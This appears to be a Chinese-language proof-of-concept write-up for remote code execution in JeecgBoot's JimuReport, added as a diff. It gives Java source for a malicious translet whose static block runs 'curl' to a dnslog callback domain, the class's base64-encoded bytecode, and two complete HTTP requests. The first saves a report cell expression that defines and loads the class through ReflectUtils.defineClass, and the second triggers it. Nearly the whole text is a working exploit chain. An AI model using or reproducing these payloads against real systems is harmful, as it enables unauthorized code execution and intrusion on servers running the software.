@@ -1,0 +1,117 @@
+DNSLog验证
+使用https://dnslog.org/获得一个域名：
+
+jeecg.e7b700c1.log.dnslog.biz.
+编写poc：
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import java.io.IOException;
+
+public class test1 extends AbstractTranslet {
+   public test1() {
+   }
+
+   public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+   }
+
+   public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+   }
+
+   static {
+      try {
+         Runtime.getRuntime().exec("curl jeecg.e7b700c1.log.dnslog.biz.");
+      } catch (IOException var1) {
+         throw new RuntimeException(var1);
+      }
+   }
+}
+javac编译，然后base64编码字节码：
+
+yv66vgAAADQAKQoACQAYCgAZABoIABsKABkAHAcAHQcAHgoABgAfBwAgBwAhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACIBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAdAQAKU291cmNlRmlsZQEACnRlc3QxLmphdmEMAAoACwcAIwwAJAAlAQAjY3VybCBqZWVjZy5lN2I3MDBjMS5sb2cuZG5zbG9nLmJpei4MACYAJwEAE2phdmEvaW8vSU9FeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwACgAoAQAFdGVzdDEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAABAABAAoACwABAAwAAAAhAAEAAQAAAAUqtwABsQAAAAEADQAAAAoAAgAAAAkABAAKAAEADgAPAAIADAAAABkAAAADAAAAAbEAAAABAA0AAAAGAAEAAAANABAAAAAEAAEAEQABAA4AEgACAAwAAAAZAAAABAAAAAGxAAAAAQANAAAABgABAAAAEAAQAAAABAABABEACAATAAsAAQAMAAAAVAADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAIADQAAABYABQAAABQACQAXAAwAFQANABYAFgAYABQAAAAHAAJMBwAVCQABABYAAAACABc=
+最终poc：
+
+POST /jmreport/save?previousPage=xxx&jmLink=YWFhfHxiYmI=&token=123 HTTP/1.1
+Host: 192.168.171.1:8085
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: application/json, text/plain, */*
+Content-Type: application/json
+Content-Length: 3456
+
+
+{
+    "loopBlockList": [],
+    "area": false,
+    "printElWidth": 718,
+    "excel_config_id": "980882669965455363",
+    "printElHeight": 1047,
+    "rows": {
+        "4": {
+            "cells": {
+                "4": {
+                    "text": "=(use org.springframework.cglib.core.*;use org.springframework.util.*;ReflectUtils.defineClass('test1', Base64Utils.decodeFromString('yv66vgAAADQAKQoACQAYCgAZABoIABsKABkAHAcAHQcAHgoABgAfBwAgBwAhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACIBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAdAQAKU291cmNlRmlsZQEACnRlc3QxLmphdmEMAAoACwcAIwwAJAAlAQAjY3VybCBqZWVjZy5lN2I3MDBjMS5sb2cuZG5zbG9nLmJpei4MACYAJwEAE2phdmEvaW8vSU9FeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwACgAoAQAFdGVzdDEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAABAABAAoACwABAAwAAAAhAAEAAQAAAAUqtwABsQAAAAEADQAAAAoAAgAAAAkABAAKAAEADgAPAAIADAAAABkAAAADAAAAAbEAAAABAA0AAAAGAAEAAAANABAAAAAEAAEAEQABAA4AEgACAAwAAAAZAAAABAAAAAGxAAAAAQANAAAABgABAAAAEAAQAAAABAABABEACAATAAsAAQAMAAAAVAADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAIADQAAABYABQAAABQACQAXAAwAFQANABYAFgAYABQAAAAHAAJMBwAVCQABABYAAAACABc='), ClassLoader.getSystemClassLoader());)",
+                    "style": 0
+                }
+            },
+            "height": 25
+        },
+        "len": 96,
+        "-1": {
+            "cells": {
+                "-1": {
+                    "text": "${gongsi.id}"
+                }
+            },
+            "isDrag": true
+        }
+    },
+    "dbexps": [],
+    "toolPrintSizeObj": {
+        "printType": "A4",
+        "widthPx": 718,
+        "heightPx": 1047
+    },
+    "dicts": [],
+    "freeze": "A1",
+    "dataRectWidth": 701,
+    "background": false,
+    "name": "sheet1",
+    "autofilter": {},
+    "styles": [
+        {
+            "align": "center"
+        }
+    ],
+    "validations": [],
+    "cols": {
+        "4": {
+            "width": 95
+        },
+        "len": 50
+    },
+    "merges": [
+        "E4:F4",
+        "B4:B5",
+        "C4:C5",
+        "D4:D5",
+        "G4:G5",
+        "H4:H5",
+        "I4:I5",
+        "D1:G1",
+        "H3:I3"
+    ]
+}
+POST /jmreport/show?previousPage=xxx&jmLink=YWFhfHxiYmI= HTTP/1.1
+Host: 192.168.171.1:8085
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: application/json, text/plain, */*
+Content-Type: application/json
+Content-Length: 38
+
+
+{
+    "id": "980882669965455363"
+}
